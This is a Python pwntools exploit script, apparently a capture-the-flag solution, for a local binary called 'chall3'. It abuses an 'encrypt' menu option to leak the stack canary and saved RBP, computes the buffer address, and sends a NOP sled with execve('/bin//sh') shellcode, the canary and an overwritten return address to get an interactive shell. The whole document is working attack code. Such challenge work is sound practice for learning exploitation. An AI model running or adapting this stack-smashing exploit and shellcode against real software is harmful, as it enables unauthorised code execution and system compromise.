from pwn import *

# Start the program with pwntools
p = process('./chall3')

# Attach GDB to the process

#gdb.attach(p, '''
#set follow-fork-mode child
#break *0x00401901
#''')

# Clear any initial output and print it for debugging
print("Clearing initial output...")
initial_output = p.clean().decode()
print(initial_output)

# Synchronize with the menu prompt
if "[M] Select" in initial_output:  # Check if the menu prompt is already printed
    print("Menu already received. Proceeding to send choice...")
else:
    print("Waiting for menu prompt...")
    print(p.recvuntil(b"[Q] Your choice:").decode())

# ------ Setup a random key we don't care ------
print("Sending choice 2 (config)...")
p.sendline(b"2")

print("Waiting for XOR key prompt...")
print(p.recvuntil(b"[Q] xor key:").decode())
p.sendline(b"1234") 

# -----------------------------------------------

# --------------- Get Saved RBP and Canary ---------------
print("Waiting for menu prompt again...")
print(p.recvuntil(b"[Q] Your choice:").decode())
p.sendline(b"1")

print(p.recvuntil(b"[Q] Enter a string with a secret info to protect:").decode())
p.sendline(b"test") # user input : random secret
print(p.recvuntil(b"[Q] At which position does your secret starts in the string:").decode())
p.sendline(b"200")  # user input : offset
print(p.recvuntil(b"[Q] How many characters do you want to encrypt:").decode())
p.sendline(b"16")   # user input : n-length bytes to read in the stack (canary and rbp, 2*8 bytes = 16)


print("Pausing to extract canary...")
output = p.recvuntil(b"[Q] Your choice:").decode()
print(output)  # raw data is in little endian

# Assume the canary and rbp is printed like: "[I] Initial string = 00a91aac36625435"
match = re.search(r"\[I\] Initial string = ([0-9a-f]+)", output)
if match:
    canary = bytes.fromhex(match.group(1))[:8]      # extracting canary from the program output
    print(f"Extracted canary: {canary}")
    saved_rbp = bytes.fromhex(match.group(1))[-8:]  # extracting saved_rbp from the program output
    print(f"Extracted saved_rbp: {saved_rbp}")
    p.sendline(b"2")
else:
    print("Failed to extract canary.")
    exit()

# ---------------------------------------------------------

# Handle XOR key input
print("Waiting for XOR key prompt...")
print(p.recvuntil(b"[Q] xor key:").decode())

# ----- Store Canary, RBP & Calculate Buffer Pointer -----

# shellcode is the pointer of the buffer so rbp - 0x70
# we need to read the saved_rbp since we have it stored in little endian and then calculate the buffer addr with offset

# Calculate the buffer address
saved_rbp_int = int.from_bytes(saved_rbp, byteorder='little')  # Convert saved_rbp to integer
buffer_addr = saved_rbp_int - 0x70                             # Calculate addr. by the rbp offset to achieve the buffer ptr
addr_ret = buffer_addr.to_bytes(8, byteorder='little')         # Ensure addr_ret is exactly 8 bytes
canary_int = int.from_bytes(canary, byteorder='little')        # Convert canary to integer
print(f"rbp address                    : {hex(saved_rbp_int)}")
print(f"Calculated buffer address      : {hex(buffer_addr)}")
print(f"Return address bytes (addr_ret): {addr_ret.hex()}")
print(f"Canary value                   : {hex(canary_int)}")

# ---------------------------------------------------------

# -------- Construct the payload --------

# Constants
nop = b"\x90"
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
space_buffer_canary = 104
buffer_size = 100
canary_repeat = 2
padding = b"\x62"

shellcode_size = len(shellcode)
nop_space = buffer_size - shellcode_size

padding_amount = space_buffer_canary - buffer_size  # padding to align with the canary and smash eip
        # [nop slide ------ shellcode] --------- pad -------- smash canary --- smash rbp -- smash eip
payload= nop * nop_space + shellcode + padding*padding_amount + canary * canary_repeat +  addr_ret
#  77 (nop bytes) + 23 (shellcode bytes) + 4 (padding bytes) = 104 bytes and then the rest (2 * 8 bytes) is to smash.
print(f"Constructed payload: {payload}")
p.sendline(payload)

print("Waiting for menu prompt again...")
print(p.recvuntil(b"[Q] Your choice:").decode())

# Continue to interact with the program (Exit the program by entering 3)
p.interactive()
